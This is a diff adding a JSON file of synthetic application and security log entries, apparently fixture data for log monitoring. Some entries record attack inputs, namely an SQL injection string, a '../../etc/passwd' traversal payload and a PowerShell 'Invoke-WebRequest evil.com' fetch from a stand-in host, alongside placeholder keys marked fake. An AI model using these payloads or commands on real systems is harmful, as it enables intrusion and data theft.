@@ -1,0 +1,47 @@
+[
+    {"timestamp":"2025-11-22T09:01:12","level":"INFO","message":"User login successful","user":"user102","ip":"192.168.0.12"},
+    {"timestamp":"2025-11-22T09:02:01","level":"WARN","message":"Failed login attempt","user":"admin","ip":"203.0.113.45"},
+    {"timestamp":"2025-11-22T09:02:05","level":"WARN","message":"Failed login attempt","user":"admin","ip":"203.0.113.45"},
+    {"timestamp":"2025-11-22T09:02:09","level":"SECURITY","message":"Brute force attack detected","attempts":12,"ip":"203.0.113.45"},
+  
+    {"timestamp":"2025-11-22T09:03:22","level":"CRITICAL","message":"SQL Injection attempt","payload":"' OR '1'='1' --","endpoint":"/login","ip":"185.22.67.98"},
+  
+    {"timestamp":"2025-11-22T09:04:11","level":"ALERT","message":"Invalid API key used","api_key":"sk_test_fake_98273kdjs","client":"external-app"},
+  
+    {"timestamp":"2025-11-22T09:05:44","level":"ERROR","message":"Database connection refused","code":"DB_CONN_ERR_503"},
+  
+    {"timestamp":"2025-11-22T09:06:19","level":"INFO","message":"File uploaded","file":"report.pdf","user":"user301"},
+  
+    {"timestamp":"2025-11-22T09:07:33","level":"SECURITY","message":"DDoS pattern detected","requests_per_min":1450,"ip":"77.45.92.188"},
+  
+    {"timestamp":"2025-11-22T09:08:56","level":"ERROR","message":"NullPointerException","service":"OrderService","line":312},
+  
+    {"timestamp":"2025-11-22T09:09:14","level":"ALERT","message":"API key leaked in headers","api_key":"ghp_FAKE123456789TOKEN"},
+  
+    {"timestamp":"2025-11-22T09:10:27","level":"CRITICAL","message":"Malware file detected","file":"trojan.exe","hash":"fakehash99283"},
+  
+    {"timestamp":"2025-11-22T09:11:45","level":"WARN","message":"High memory usage","service":"payment-service","usage":"94%"},
+  
+    {"timestamp":"2025-11-22T09:12:50","level":"SECURITY","message":"Unauthorized access attempt","endpoint":"/admin","ip":"91.201.44.120"},
+  
+    {"timestamp":"2025-11-22T09:13:32","level":"ERROR","message":"Timeout while processing request","endpoint":"/api/orders"},
+  
+    {"timestamp":"2025-11-22T09:14:25","level":"INFO","message":"Session expired","user":"user102"},
+  
+    {"timestamp":"2025-11-22T09:15:11","level":"ALERT","message":"Suspicious token pattern detected","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake"},
+  
+    {"timestamp":"2025-11-22T09:16:03","level":"SECURITY","message":"Path traversal attack","payload":"../../etc/passwd","endpoint":"/download","ip":"66.118.90.34"},
+  
+    {"timestamp":"2025-11-22T09:17:10","level":"ERROR","message":"Service unavailable","code":503},
+  
+    {"timestamp":"2025-11-22T09:18:22","level":"CRITICAL","message":"Ransomware activity detected","process":"encryptor.exe"},
+  
+    {"timestamp":"2025-11-22T09:19:41","level":"INFO","message":"User logout","user":"user301"},
+  
+    {"timestamp":"2025-11-22T09:20:55","level":"WARN","message":"Rate limit exceeded","ip":"120.34.56.78"},
+  
+    {"timestamp":"2025-11-22T09:22:10","level":"SECURITY","message":"Suspicious PowerShell command execution","command":"Invoke-WebRequest evil.com"},
+  
+    {"timestamp":"2025-11-22T09:23:59","level":"ALERT","message":"Exposed AWS key detected","api_key":"AKIA_FAKEKEY1234567"}
+  ]
+  
